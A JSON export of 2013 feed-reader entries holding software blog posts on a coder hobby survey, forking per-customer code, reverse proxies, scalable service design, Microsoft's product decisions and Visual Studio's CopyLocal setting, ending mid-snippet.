{"_id":986,"_uid":986,"_dt":1373741607074,"_s":"c9a7f63d516856d0f359f701b5e269e0"}
{"subscription":{"$wrap":"$oid","v":14},"link":"http://feedproxy.google.com/~r/CodeRant/~3/1_tUiKiAwP8/coders-musicians-and-cooks.html","title":"Coders, Musicians and Cooks","published":{"$wrap":"$date","v":1362473520000,"h":"2013-03-05T08:52:00.000Z"},"starred":false,"read":false,"content":"<p>In a light hearted Twitter exchange yesterday I asked why so many coders also played guitar. Mark Seemann suggested that there was also a high correlation with cooking.</p><p><a href=\"http://lh6.ggpht.com/-vTPbxRI_rSo/UTWyTIz0AKI/AAAAAAAAHk4/OIp1Mqp9L_s/s1600-h/code_play_cook_tweet%25255B4%25255D.png\"><img style=\"background-image: none; border-bottom: 0px; border-left: 0px; padding-left: 0px; padding-right: 0px; display: inline; border-top: 0px; border-right: 0px; padding-top: 0px\" title=\"code_play_cook_tweet\" border=\"0\" alt=\"code_play_cook_tweet\" src=\"http://lh6.ggpht.com/-4Q6iG7idYx0/UTWyT96F_OI/AAAAAAAAHk8/xWYW3WSh4Xs/code_play_cook_tweet_thumb%25255B2%25255D.png?imgmax=800\" width=\"534\" height=\"237\" /></a></p><p>How about a survey? Mark and I have over 4000 twitter followers between us so I was sure we could get a few of them to click a few radio buttons, with no promise of reward, but with the warm feeling that they were helping to progress the anthropological understanding of the coding tribe. So I<a href=\"https://docs.google.com/a/suteki.co.uk/forms/d/1I_UwVA8XK6HE-8AvFnyn8EJSeryCs-CNS1qC-f-u5u8/viewform\">created a survey</a>and waited for the results to stream in. Of course, as Rob Pickering pointed out, this kind of self selecting survey is very unscientific, but fun nonetheless.</p><p>What have we learnt?</p><ol><li>It is ridiculously easy to create an online survey using Google Drive. Just click ‘new form’, type in a few questions, and Bob’s yer uncle. It automatically builds a nice summary graphic on the fly as the survey progresses (see below).</li><li>Most of Mark and I’s followers are C# coders. 81%. That’s not really surprising.</li><li>More coders cook than play musical instruments: 85% verses 53%. That’s not really surprising either. I expect if you took a survey of the general population you’d find quite a high percentage who cook verses those who play.</li><li>Guitar is by far the most popular instrument among coders. 30% play guitar. This confirms my hunch, but doesn’t answer my question – why it’s such a high percentage.</li></ol><p>Here is the Google Drive graphic of the results.</p><p><a href=\"http://lh5.ggpht.com/-9TVsHDsnQC8/UTWyUvhhVDI/AAAAAAAAHlE/aogMkMHsSgs/s1600-h/code_play_cook_survey%25255B4%25255D.png\"><img style=\"background-image: none; border-bottom: 0px; border-left: 0px; padding-left: 0px; padding-right: 0px; display: inline; border-top: 0px; border-right: 0px; padding-top: 0px\" title=\"code_play_cook_survey\" border=\"0\" alt=\"code_play_cook_survey\" src=\"http://lh5.ggpht.com/-TRrvgW2MSUc/UTWyVOxHjqI/AAAAAAAAHlI/dJqEUMw2TJo/code_play_cook_survey_thumb%25255B2%25255D.png?imgmax=800\" width=\"676\" height=\"927\" /></a></p>","author":"Mike Hadlow","_id":{"$wrap":"$oid","v":986}}
{"k":"0000000082","o":"0000006988","v":"001"}
{"_id":987,"_uid":987,"_dt":1373741607074,"_s":"9093aa6cd28bbbabb76032004e3444ae"}
{"subscription":{"$wrap":"$oid","v":14},"link":"http://feedproxy.google.com/~r/CodeRant/~3/dMaC7-XpyJ4/fractured-product-syndrome.html","title":"Fractured Product Syndrome","published":{"$wrap":"$date","v":1361984400000,"h":"2013-02-27T17:00:00.000Z"},"starred":false,"read":false,"content":"<p>How do you sell your software product? Do you fork the source code of your previous customer, modify it a little and deploy it as its own instance with its own database? Maybe each customer even has their own server? Their own set of servers?</p><p>You are suffering from the<em>Fractured Product Syndrome</em>.</p><p>Let me tell you a story.</p><p>Colin and Alex have a little web development consultancy, called Coaltech (get it?) they are pretty handy with ASP.NET and SQL Server and already had a respectable list of satisfied clients when a local car hire company, Easy Wheels, asked them if they could build them a car booking system. It would keep a list of Easy Wheels’ cars and allow customers to view them and book them online.</p><p>Colin and Alex signed a contract with Easy Wheels and got busy. Their “just do it” attitude to getting features done meant that the code wasn’t particularly beautiful, but it did the job and after a couple of months work the system went live. Easy Wheels were very happy with their new system, so happy in fact that they started to tell other independent car rental companies about it. A few months later Colin and Alex got a call from Hire My Ride. They loved what Coaltech had done for Easy Wheels and wanted a similar system. Of course it would have to be redesigned to fit in with Hire My Ride’s branding, but the basic functionality was pretty much identical. Colin and Alex did the obvious thing, they took a copy of the Easy Wheels code and tweaked it for Hire My Ride. Of course they charged the same bespoke software price for Hire My Ride’s system.</p><p>Soon a third and fourth car hire company had asked Coaltech for their ‘system’. Each time Colin and Alex took a copy of the last customer’s code – it made sense to take the most recent code because they inevitably added a few refinements with each customer – and then they altered it to match the new customer’s requirements. Before long they had arranged a deal with another web agency to take over all their non-car-hire work and decided to concentrate full time on the ‘system’. It needed a name too, they couldn’t carry on calling it ‘Easy Wheels’ and they certainly couldn’t market it like that. Soon it became ‘Coaltech Cars’ with a new marketing website. They also found that they couldn’t keep up with demand with just the two of them doing customer implementations. Each new customer took around six weeks of development work with the inevitable to-and-fro of slightly different requirements and design changes. To help meet demand they started to hire developers. First Jez, then Dave, then Neville. They all modified the software in slightly different ways, but it didn’t seem to matter at the time.</p><p>Fast forward five years. Coaltech now has 50 employees and around 50 customers. It’s fair to say that they are the leading vendor of independent car rental management systems. The majority of their staff are developers, although they also have a small sales, HR and customer relationship management team. You would have thought that Colin and Alex would be happy to have turned their little web development company into such a success, but instead life just seemed to be one long headache. Although the company had grown, it always seemed hard to turn a profit. As it was customers often balked at the price of the system. The same bug would turn up again and again for different customers. There never seemed to be enough time to fix them all. Even though they might have delivered a new feature for one client, it always seemed to take just as long to implement it for another; sometimes longer depending on what code they’d been forked from. The small team that looked after the servers were in constant fire fighting mode and got very upset when anyone suggested ‘upgrading’ any of the clients -  it always meant bugs, downtime and screaming customers. And then the government changed the Value Added Tax rate. Colin had to cancel his holiday and they lost two of their best developers after several weeks of late nights and no weekends while they updated and redeployed 50 separate web applications.</p><p>The end for Coaltech cars came slowly and painfully. Alex had the first hint of it when he was made aware of a little company called RentBoy. They had a little software-as-a-service product for small car hire companies. To use it you entered your credit card number, a logo, a few other details, and you were good to go. They weren’t any immediate competition for Coaltech Cars, having only a small subset of the features, but they soon captured the low end of the market, the one or two man band car companies that had never been able to afford Coaltech’s sign up or licensing fees.</p><p>But then the features started coming thick and fast and soon Coaltech found they were loosing out to RentBoy when bidding for clients. Colin found an article on the<a href=\"http://highscalability.com/\">High Scalability</a>blog about RentBoy’s architecture. They had a single scalable application that served all their customers, one place to fix bugs, one point of scalability and maintenance. They practiced continuous deployment allowing them to quickly build and release new features for all their customers. The company had four employees and already more customers than Coaltech. They charged about a tenth of Coaltech’s fees.</p><p>Coaltech’s new client revenues soon dried up. They’d always made a certain amount of money from sign-up fees. Too late they realised that they had to start shedding staff, always a painful thing for a small closely knit company. The debts mounted until the bank would no longer support them, and before long they had to declare bankruptcy. Luckily Colin and Alex managed to get jobs as project managers in enterprise development teams.</p><p>The moral of the story? Try to avoid Fractured Product Syndrome if you possibly can. Although simply forking the source code for each new customer appears by far the easiest thing to do at the start, it simply doesn’t scale. Start thinking about how to build multi-tenanted software-as-a-service long before you get to where Coaltech got to. Learn to say ‘no’ to customers if you have to. It’s far better to have a high number of low value customers than smaller numbers of higher value ones on a differentiated platform. It’s much easier for a low-value volume software provider to move into the high-value space than for a high-value provider to move down.</p><p>Learn to recognise Fractured Product Syndrome and address it before it gets serious!</p>","author":"Mike Hadlow","_id":{"$wrap":"$oid","v":987}}
{"k":"0000000082","o":"0000007839","v":"001"}
{"_id":988,"_uid":988,"_dt":1373741607074,"_s":"6a2fd77d9f32060f59370523cd8f4622"}
{"subscription":{"$wrap":"$oid","v":14},"link":"http://feedproxy.google.com/~r/CodeRant/~3/Ik-9FWofdpI/the-benefits-of-reverse-proxy.html","title":"The Benefits of a Reverse Proxy","published":{"$wrap":"$date","v":1367594520000,"h":"2013-05-03T15:22:00.000Z"},"starred":false,"read":false,"content":"<p>A typical ASP.NET public website hosted on IIS is usually configured in such a way that the server that IIS is installed on is visible to the public internet. HTTP requests from a browser or web service client are routed directly to IIS which also hosts the ASP.NET worker process.  All the functionality needed to produce the web site is embodied in a single server. This includes caching, SSL termination, authentication, serving static files and compression. This approach is simple and straightforward for small sites, but is hard to scale, both in terms of performance, and in terms of managing the complexity of a large complex application. This is especially true if you have a distributed service oriented architecture with multiple HTTP endpoints that appear and disappear frequently.</p><p>A reverse proxy is server component that sits between the internet and your web servers. It accepts HTTP requests, provides various services, and forwards the requests to one or many servers.</p><p><img title=\"font-side-proxy\" style=\"border-top: 0px; border-right: 0px; border-bottom: 0px; border-left: 0px; display: inline\" border=\"0\" alt=\"font-side-proxy\" src=\"http://lh4.ggpht.com/-woCHbnyXB3k/UYPWR481THI/AAAAAAAAIx8/xn9GR0qAqC4/font-side-proxy%25255B5%25255D.png?imgmax=800\" width=\"600\" height=\"278\" /></p><p>Having a point at which you can inspect, transform and route HTTP requests before they reach your web servers provides a whole host of benefits. Here are some:</p><p><strong>Load Balancing</strong></p><p>This is the reverse proxy function that people are most familiar with. Here the proxy routes incoming HTTP requests to a number of identical web servers. This can work on a simple round-robin basis, or if you have statefull web servers (it’s better not to) there are session-aware load balancers available. It’s such a common function that load balancing reverse proxies are usually just referred to as ‘load balancers’. There are specialized load balancing products available, but many general purpose reverse proxies also provide load balancing functionality.</p><p><strong>Security</strong></p><p>A reverse proxy can hide the topology and characteristics of your back-end servers by removing the need for direct internet access to them. You can place your reverse proxy in an internet facing DMZ, but hide your web servers inside a non-public subnet.</p><p><strong>Authentication</strong></p><p>You can use your reverse proxy to provide a single point of authentication for all HTTP requests.</p><p><strong>SSL Termination</strong></p><p>Here the reverse proxy handles incoming HTTPS connections, decrypting the requests and passing unencrypted requests on to the web servers. This has several benefits:</p><ul><li>Removes the need to install certificates on many back end web servers.</li><li>Provides a single point of configuration and management for SSL/TLS</li><li>Takes the processing load of encrypting/decrypting HTTPS traffic away from web servers.</li><li>Makes testing and intercepting HTTP requests to individual web servers easier.</li></ul><p><strong>Serving Static Content</strong></p><p>Not strictly speaking ‘reverse proxying’ as such. Some reverse proxy servers can also act as web servers serving static content. The average web page can often consist of megabytes of static content such as images, CSS files and JavaScript files. By serving these separately you can take considerable load from back end web servers, leaving them free to render dynamic content.</p><p><strong>Caching</strong></p><p>The reverse proxy can also act as a cache. You can either have a dumb cache that simply expires after a set period, or better still a cache that respects Cache-Control and Expires headers. This can considerably reduce the load on the back-end servers.</p><p><strong>Compression</strong></p><p>In order to reduce the bandwidth needed for individual requests, the reverse proxy can decompress incoming requests and compress outgoing ones. This reduces the load on the back-end servers that would otherwise have to do the compression, and makes debugging requests to, and responses from, the back-end servers easier.</p><p><strong>Centralised Logging and Auditing</strong></p><p>Because all HTTP requests are routed through the reverse proxy, it makes an excellent point for logging and auditing.</p><p><strong>URL Rewriting</strong></p><p>Sometimes the URL scheme that a legacy application presents is not ideal for discovery or search engine optimisation. A reverse proxy can rewrite URLs before passing them on to your back-end servers. For example, a legacy ASP.NET application might have a URL for a product that looks like this:</p><p><em>http://www.myexampleshop.com/products.aspx?productid=1234</em></p><p>You can use a reverse proxy to present a search engine optimised URL instead:</p><p><em>http://www.myexampleshop.com/products/1234/lunar-module</em></p><p><strong>Aggregating Multiple Websites Into the Same URL Space</strong></p><p>In a distributed architecture it’s desirable to have different pieces of functionality served by isolated components. A reverse proxy can route different branches of a single URL address space to different internal web servers.</p><p>For example, say I’ve got three internal web servers:</p><div id=\"codeSnippetWrapper\"><pre id=\"codeSnippet\" style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\">http://products.internal.net/<br />http://orders.internal.net/<br />http://stock-control.internal.net/</pre><br /></div><p>I can route these from a single external domain using my reverse proxy:</p><div id=\"codeSnippetWrapper\"><pre id=\"codeSnippet\" style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\">http://www.example.com/products/    -<span style=\"color: #0000ff\">&gt;</span>http://products.internal.net/<br />http://www.example.com/orders/    -<span style=\"color: #0000ff\">&gt;</span>http://orders.internal.net/<br />http://www.example.com/stock/    -<span style=\"color: #0000ff\">&gt;</span>http://stock-control.internal.net/</pre><br /></div><p></p><p>To an external customer it appears that they are simply navigating a single website, but internally the organisation is maintaining three entirely separate sites. This approach can work extremely well for web service APIs where the reverse proxy provides a consistent single public facade to an internal distributed component oriented architecture.</p><p><strong>So …</strong></p><p>So, a reverse proxy can off load much of the infrastructure concerns of a high-volume distributed web application.</p><p>We’re currently looking at<a href=\"http://wiki.nginx.org/Main\">Nginx</a>for this role. Expect some practical Nginx related posts about how to do some of this stuff in the very near future.</p><p>Happy proxying!</p>","author":"Mike Hadlow","_id":{"$wrap":"$oid","v":988}}
{"k":"0000000082","o":"0000007502","v":"001"}
{"_id":989,"_uid":989,"_dt":1373741607075,"_s":"66db6b35964defd840251e98f669be1c"}
{"subscription":{"$wrap":"$oid","v":14},"link":"http://feedproxy.google.com/~r/CodeRant/~3/w2haGYxhroM/how-to-write-scalable-services.html","title":"How to Write Scalable Services","published":{"$wrap":"$date","v":1359723720000,"h":"2013-02-01T13:02:00.000Z"},"starred":false,"read":false,"content":"<p><img alt=\"SDO_arch\" src=\"http://www.slate.com/content/dam/slate/blogs/bad_astronomy/2012/12/best_of_2012_photos/SDO_arch.jpg.CROP.article920-large.jpg\" width=\"613\" height=\"347\" /></p><p>I’ve spent the last five years implementing and thinking about service oriented architectures. One of the core benefits of a service oriented approach is the promise of greatly enhanced scalability and redundancy. But to realise these benefits we have to write our services to be ‘scalable’. What does this mean?</p><p>There are two fundamental ways we can scale software: 'Vertically' or 'horizontally'.</p><ul><li><p><strong>Vertical Scaling</strong>addresses the scalability of a single instance of the service. A simple way to scale most software is simply to run it on a more powerful machine; one with a faster processor or more memory. We can also look for performance improvements in the way we write the code itself. An excellent example of company using this approach is<a href=\"http://martinfowler.com/articles/lmax.html\">LMAX</a>. However, there are many drawbacks to the vertical scaling approach. Firstly the costs are rarely linear; ever more powerful hardware tends to be exponentially more expensive and the costs (and constraints) of building sophisticated performance optimised software are also considerable. Indeed premature performance optimisation often leads to overly complex software that's hard to reason about and therefore more prone to defects and high maintenance costs. Most importantly, vertical scaling does not address redundantcy; vertically scaling an application just turns a small single point of failure into a large single point of failure.</p></li><li><p><strong>Horizontal Scaling.</strong>Here we run multiple instances of the application rather than focussing on the performance of a single instance. This has the advantage of being linearly scalable; rather than buying a bigger, more expensive box, we just buy more copies of the same cheap box. With the right architectural design, this approach can scale massively. Indeed it's the approach taken by almost all of largest internet scale companies: Facebook, Google, Twitter etc.. Horizontal Scaling also introduces redundancy; the loss of a single node need not impact the system as a whole. For these reasons, horizontal scaling is the preferred approach to building scalable, redundant systems.</p></li></ul><p>So, the fundamental approach to building scalable systems is to compose them of horizontally scaled services. In order to do this we need to follow a few basic principles:</p><ul><li><p><strong>Stateless.</strong>Any services that stores state across an interaction with another service is hard to scale. For example, a web service that stores in-memory session state between requests requires a sophisticated session-aware load balancer. A stateless service, by contrast, only requires simple round-robin load balancing. For a web application (or service) you should avoid using session state or any static or application level variables.</p></li><li><p><strong>Coarse Grained API.</strong>To be stateless, a service should expose an API that exposes operations as a single interaction. A chatty API, where one sets up some data, asks for some transition, and then reads off some results, implies statefulness by its design. The service would need to identify a session and then maintain information about that session between successive calls. Instead a single call, or message, to the service should encapsulate all the information that the service requires to complete the operation.</p></li><li><p><strong>Idempotent.</strong>Much scalable infrastructure is a trade-off between competing constraints. Delivery guarantees are one of these. For various reasons it's is far simpler to guarantee 'at least once' delivery than 'exactly once'. If you can make your software tolerant of multiple deliveries of the same message it will be easier to scale.</p></li><li><p><strong>Embrace Failure.</strong>Arrays of services are redundant if the system as a whole can survive the loss of a single node. You should design your services and infrastructure to expect and survive failure. Consider implementing a<a href=\"http://www.codinghorror.com/blog/2011/04/working-with-the-chaos-monkey.html\">Chaos Monkey</a>that randomly kills processes. If you start by expecting your services to fail, you'll be prepared when they inevitably do.</p></li><li><p><strong>Avoid instance specific configuration.</strong>A scalable service should be designed in such a way that it doesn't need to know about other instances of itself, or have to identify itself as a specific instance. I shouldn't need to have to configure one instance any differently than another. This would include communication mechanisms that require messages to be addressed to a specific instance of the service, or some non-convention based way that the service was required to identify itself. Instead we should rely on infrastructure (load-balancers, pub-sub messaging etc.) to manage the communication between arrays of services.</p></li><li><p><strong>Simple automated deployment.</strong>Have a service that can scale is no advantage if we can't deploy it when we are close to capacity. A scalable system must have automated processes to deploy new instances of services as the need arises.</p></li><li><p><strong>Monitoring.</strong>We need to know when services are close to capacity so that we can add additional service instances. Monitoring is usually an infrastructure concern; we should be monitoring CPU, network, and memory usage and have alerts in place to warn us when these pass certain trigger points. Sometimes it's worth introducing application specific alerts when some internal trigger is reached, such as the number of items in an in-memory queue, for example.</p></li><li><p><strong>KISS - Keep It Small and Simple.</strong>This is good advice for any software project, but is especially pertinent to building scalable resilient systems. Large monolithic codebases are hard to reason about, hard to monitor, and hard to scale. Building your system out of many small pieces makes it easy to address those pieces independently. Design your system so that each service has only one purpose and is decoupled from the operations of other services. Have your services communicate using non-proprietary open standards to avoid vendor lock-in and allow for a heterogeneous platform. JSON over HTTP, for example, is an excellent choice for intra-service communication. Every platform has HTTP and JSON libraries and there is abundant off-the-shelf infrastructure (proxies, load-balancers, caches) that can be used to help your system scale.</p></li></ul><p>This post just gives a few pointers to building scalable systems, for far more detailed examples and case studies I can't recommend the<a href=\"http://highscalability.com/\">High Scalability Blog</a>enough. The Dodgy Coder blog has a very nice summary of some of the High Scalability case studies<a href=\"http://www.dodgycoder.net/2012/04/scalability-lessons-from-google-youtube.html\">here</a>.</p>","author":"Mike Hadlow","_id":{"$wrap":"$oid","v":989}}
{"k":"0000000082","o":"0000001527","v":"001"}
{"_id":990,"_uid":990,"_dt":1373741607077,"_s":"cfac526e82bdd744643c6ed0dbbd8d2e"}
{"subscription":{"$wrap":"$oid","v":14},"link":"http://feedproxy.google.com/~r/CodeRant/~3/gpnjgNAyH9k/easynetq-on-net-rocks.html","title":"EasyNetQ on .NET Rocks!","published":{"$wrap":"$date","v":1361450340000,"h":"2013-02-21T12:39:00.000Z"},"starred":false,"read":false,"content":"<p><a href=\"http://www.dotnetrocks.com/Default.aspx\"><img style=\"background-image: none; border-bottom: 0px; border-left: 0px; padding-left: 0px; padding-right: 0px; display: inline; border-top: 0px; border-right: 0px; padding-top: 0px\" title=\"dotnetrocks\" border=\"0\" alt=\"dotnetrocks\" src=\"http://lh6.ggpht.com/-ISTHxvDBQ14/USYVnvKVGUI/AAAAAAAAHb4/8cpFxClQo2k/dotnetrocks%25255B5%25255D.png?imgmax=800\" width=\"493\" height=\"134\" /></a></p><p>Last week I had the pleasure of being interviewed by Carl Franklin and Richard Campbell for a .NET Rocks episode on RabbitMQ and EasyNetQ. It was terrific fun and a real honour to be invited on the show. I’ve been listening to .NET Rocks since it started in 2002 so you can imagine how excited I was. Carl and Richard are seasoned pros when it comes to podcasting, and the awesome ninja editing skills they posses turned my rather hesitant and rambling answers into something that almost sounded coherent.</p><p>You can listen to the show on the link below:</p><p><a href=\"http://www.dotnetrocks.com/default.aspx?ShowNum=848\">http://www.dotnetrocks.com/default.aspx?ShowNum=848</a></p><p>Now Richard, about that Tesla …</p>","author":"Mike Hadlow","_id":{"$wrap":"$oid","v":990}}
{"k":"0000000082","o":"0000006719","v":"001"}
{"_id":991,"_uid":991,"_dt":1373741607077,"_s":"b375cd34d4797b254d5609728966125d"}
{"subscription":{"$wrap":"$oid","v":15},"link":"http://feedproxy.google.com/~r/CodeBetter/~3/GFR5MPEArHQ/","title":"Microsoft’s lack of common sense","published":{"$wrap":"$date","v":1371726337000,"h":"2013-06-20T11:05:37.000Z"},"starred":false,"read":false,"content":"<p>In my opinion, for the last two years Microsoft totally lose any common sense. The company behaves like if a 1% small group of blinded managers took the power of decision and put all its energy in wrecking the work of the 99% others MSFT. Nowadays Microsoft is stressed by Apple, Sony, Google, Facebook … successes and need to take action to survive in the long-term, but this obvious lack of common sense starts to have solid harmful consequences. Here are some of the craziest decisions I took note:</p><ul><li><strong style=\"line-height: 16px\">Windows 8 tiles and suppression of Start menu</strong><span style=\"line-height: 16px\">: This one is a really killer. While Windows 8 tiles make sense on a touch device, while we can forecast that in two years most devices running Windows will come with a touch screen, today 99% of real-world user of Windows 8 hate tiles (this number 99% is my own statistic, just by looking around me the real-world people behavior).  Not only tiles are barely practicable with a mouse, but they also are flat. Just by installing the common set of .NET dev tools and running under Windows 8 for a few months, I get hundreds of tiles randomly organized without any kind of hierarchy. There is no way I’ll take a few hours to try sort them out! I then installed a third-party Start Menu to have my Windows 8 looking like Windows 7. Unfortunately 50% of real world users (again my own statistic) are unable to <em>imagine existence/find/download/install</em>  a third-party Start Menu. The other half of users are totally stuck with their brand new PC fighting to do anything that used to be immediate under previous version of PC. Btw, some PC resellers I know just install by default a third-party Start Menu. I understand that Windows Blue will be released urgently to palliate this huge waste. But while Windows 8 is so much more superior than Windows 7 in many ways, <a href=\"http://www.reuters.com/article/2013/04/10/us-pc-data-idUSBRE93914P20130410\" target=\"_blank\">PCs sales are dropping dramatically</a>. <strong>It would have been so easy</strong> (and as far as I know everybody with a bit of common sense was fighting for that against the 1% managers with plain-power) to: 1) </span><span style=\"font-size: medium\">Propose tiles as the preference only on devices with touching screen 2) </span>Keep the Start Menu anyway.</li></ul><ul><li><strong>XBoxOne waste, even before the release</strong>: Again, some of the 1% manager were so smart that they wanted to make more money by treating gamers like idiots by keeping them captive. An internet connection was mandatory and game sharing was forbidden. Of course <a href=\"http://www.reuters.com/article/2013/06/19/us-microsoft-xbox-idUSBRE95I1MV20130619\" target=\"_blank\">they reverse their positions</a> as soon as Sony jumped on the occasion to claim that PS4 will treat gamers decently, not just like wallet. The result is that the XBoxOne brand is already strongly diminished, while I have no doubt that the XBoxOne is an awesome piece of technology conceived by thousands of ultra-smart engineers, that cost billions of dollars in R&D.</li></ul><ul><li><strong>Visual Studio release schedule</strong>: Again, some of the 1% manager thought that it’d be so cool to start <a href=\"http://blog.protegra.com/2013/06/06/visual-studio-2013/\" target=\"_blank\">releasing a new version of Visual Studio every year</a>. As a consequence VS2013 will be released in the 2013 calendar year, not even 18 months after VS2012 RTM. These guys seem to have no idea about how ISVs using VS are working. My own statistic shows that only a third of companies adopted VS2012, 12 months after RTM. VS2008 and VS2005 still represent more than 10% of VS in productions. And the largest the ISV, the more it tends to take time to upgrade to a new VS version because it takes so much energy and there are plenty of ascendant compatibility constraints around them. Having project/solution compatibility since VS2010, while good, is far from being the only parameter that ISV take account when they decide to upgrade to a new version of VS. Not only a yearly release is not suited for the bulk of users, but certainly this represents a big extra-burden for the developments team behind VS. VS releases are not anymore driven by a vision of what should be the next version, but each VS major version will just contain features that are done by the time limit, with sometime important features to be released immature, or postponed.</li></ul><p>Microsoft is loosing market shares, not because of a lack of good engineered products, but a lack of common sense. I really hope this trend will change because I am starting to worry a bit!</p><p><em>Addendum</em>: Sadly, I receive comments that ‘shoot the messenger’. They take me wrong. All my work for two decades is based on MS technologies and if I am critic today, it is because I am worrying for the future, because I don’t plan to change platform anytime soon. If MS sales numbers were up it’d be just me, but these numbers are collapsing. The web is filled up with ex-enthusiasts complaints on Windows 8 tiles forced on non-touch-devices <a href=\"http://www.forbes.com/sites/adriankingsleyhughes/2013/03/14/why-windows-8-is-the-first-windows-release-i-absolutely-hate/\" target=\"_blank\">(1)</a> <a href=\"http://www.fool.com/investing/general/2013/06/02/what-to-expect-from-microsofts-next-windows-releas.aspx\" target=\"_blank\">(2)</a> <a href=\"http://www.dailykos.com/story/2013/01/15/1179238/-Why-I-hate-Windows-8\" target=\"_blank\">(3)</a>…  Here I report how drastic decisions can ruin the great work of thousands of engineers. Windows 8 is awesome, especially when it comes to performances gain + it works on different devices. But the transition between Windows 8 and Windows 7 <strong>should</strong> have been smoother concerning classic PCs users, especially by making the Start Menu cohabits with Tiles. Non technology enthusiasts (i.e the bulk of Windows users) are just lost. A wrong decision has been taken here despite the tsunami of pre-RTM complaints, and <strong>my point is about how common-sense has been discarded in decisional process</strong>, in the various cases I am mentioning.</p><img src=\"http://feeds.feedburner.com/~r/CodeBetter/~4/GFR5MPEArHQ\" height=\"1\" width=\"1\"/>","author":"Patrick Smacchia","_id":{"$wrap":"$oid","v":991}}
{"k":"0000000082","o":"0000008311","v":"001"}
{"_id":992,"_uid":992,"_dt":1373741607077,"_s":"ab6cabaa6ff24cb59b15a595b2efa89e"}
{"subscription":{"$wrap":"$oid","v":15},"link":"http://feedproxy.google.com/~r/CodeBetter/~3/ssp1s-S4sD8/","title":"A typical effect of setting CopyLocal = true","published":{"$wrap":"$date","v":1369902429000,"h":"2013-05-30T08:27:09.000Z"},"starred":false,"read":false,"content":"<p>If you read me in the past, you certainly know that I have a problem about the Visual Studio default option that set <em>CopyLocal = true</em> in project references assemblies. I mean this option:</p><p><a href=\"http://codebetter.com/patricksmacchia/files/2013/05/NancyCopyLocal.png\"><img class=\"alignnone size-full wp-image-825\" alt=\"NancyCopyLocal\" src=\"http://codebetter.com/patricksmacchia/files/2013/05/NancyCopyLocal.png\" width=\"318\" height=\"292\" /></a></p><p>I’ve already explained the problem in my blog, and also in <a href=\"http://www.ndepend.com/WhiteBooks.aspx\">White-Books available on the NDepend website</a>. (see white-book <a href=\"http://www.ndepend.com/Res/NDependWhiteBook_Assembly.pdf\" target=\"_blank\">Partitioning code base through .NET assemblies and Visual Studio projects</a> page 4 <strong>CopyLocal = true is evil</strong>)</p><p><a href=\"http://codebetter.com/patricksmacchia/files/2013/05/CopyLocalEvil.png\"><img class=\"alignnone size-full wp-image-826\" alt=\"CopyLocalEvil\" src=\"http://codebetter.com/patricksmacchia/files/2013/05/CopyLocalEvil.png\" width=\"482\" height=\"121\" /></a></p><p>For example, in 2009 <a href=\"http://codebetter.com/patricksmacchia/2009/01/11/lessons-learned-from-the-nunit-code-base/\" target=\"_blank\">by fixing the problem on the NUnit code base</a>, I’ve been able in less than an hour, to shrink the compilation time from 32 seconds to 12 seconds.</p><p>So what is the consequence of <a href=\"http://nancyfx.org/\">Nancy framework</a> relying on <em>CopyLocal = true</em>: A huge number of cloned version on Nancy.DLL for each VS project referencing it. After a recompilation, I can count 56 occurences of Nancy.dll that weights 842 KB each, it means more than 46MB wasted. Apparently it doesn’t affect so much the VS compilation duration, I guess the VS team made VS 2012 more intelligent in the sense that if it has already parsed a reference assembly for a project, it doesn’t parse it for others, which is a good thing.</p><p><a href=\"http://codebetter.com/patricksmacchia/files/2013/05/NancyDuplication.jpg\"><img class=\"alignnone size-full wp-image-829\" alt=\"NancyDuplication\" src=\"http://codebetter.com/patricksmacchia/files/2013/05/NancyDuplication.jpg\" width=\"600\" height=\"559\" /></a></p><p>I tried to post something on the <a href=\"https://groups.google.com/forum/#!forum/nancy-web-framework\" target=\"_blank\">Nancy user group</a>, without success, hence this post. To fix this issue, it is as simple as:</p><ul><li>making sure that each project compile in a <em>..\\bin\\Debug</em> and <em>..\\bin\\Release</em> folder</li><li>from VS projects, reference the DLLs in the <em>..\\bin\\Debug</em> directory, and set<em> CopyLocal = false</em> for each reference</li></ul><p>Additional, I found <em>..\\bin</em> to be a good folder to host test assemblies. This way they can reference the application assemblies that live in <em>..\\bin\\Debug </em>and the indirection can be handled with a <em>App.config</em> file like:</p><script src=\"http://gist.github.com/5676329.js\"></script><noscript><link rel=\"stylesheet\" href=\"https://gist.github.com/assets/embed-bfcadee384027982121fdeb9930e78b2.css\"><div id=\"gist5676329\" class=\"gist\"><div class=\"gist-file\"><div class=\"gist-data gist-syntax\"><div class=\"file-data\"><table cellpadding=\"0\" cellspacing=\"0\" class=\"lines highlight\"><tr><td class=\"line-numbers\"><span class=\"line-number\" id=\"file-gistfile1-txt-L1\" rel=\"file-gistfile1-txt-L1\">1</span><span class=\"line-number\" id=\"file-gistfile1-txt-L2\" rel=\"file-gistfile1-txt-L2\">2</span><span class=\"line-number\" id=\"file-gistfile1-txt-L3\" rel=\"file-gistfile1-txt-L3\">3</span><span class=\"line-number\" id=\"file-gistfile1-txt-L4\" rel=\"file-gistfile1-txt-L4\">4</span><span class=\"line-number\" id=\"file-gistfile1-txt-L5\" rel=\"file-gistfile1-txt-L5\">5</span><span class=\"line-number\" id=\"file-gistfile1-txt-L6\" rel=\"file-gistfile1-txt-L6\">6</span><span class=\"line-number\" id=\"file-gistfile1-txt-L7\" rel=\"file-gistfile1-txt-L7\">7</span><span class=\"line-number\" id=\"file-gistfile1-txt-L8\" rel=\"file-gistfile1-txt-L8\">8</span></td><td class=\"line-data\"><pre class=\"line-pre\"><div class=\"line\" id=\"file-gistfile1-txt-LC1\">&lt;?xml version=\"1.0\" encoding=\"utf-8\" ?&gt;</div><div class=\"line\" id=\"file-gistfile1-txt-LC2\">&lt;configuration&gt;</div><div class=\"line\" id=\"file-gistfile1-txt-LC3\">  &lt;runtime&gt;</div><div class=\"line\" id=\"file-gistfile1-txt-LC4\">    &lt;assemblyBinding xmlns=\"urn:schemas-microsoft-com:asm.v1\"&gt;</div><div class=\"line\" id=\"file-gistfile1-txt-LC5\">      &lt;probing privatePath=\"Debug\" /&gt;</div><div class=\"line\" 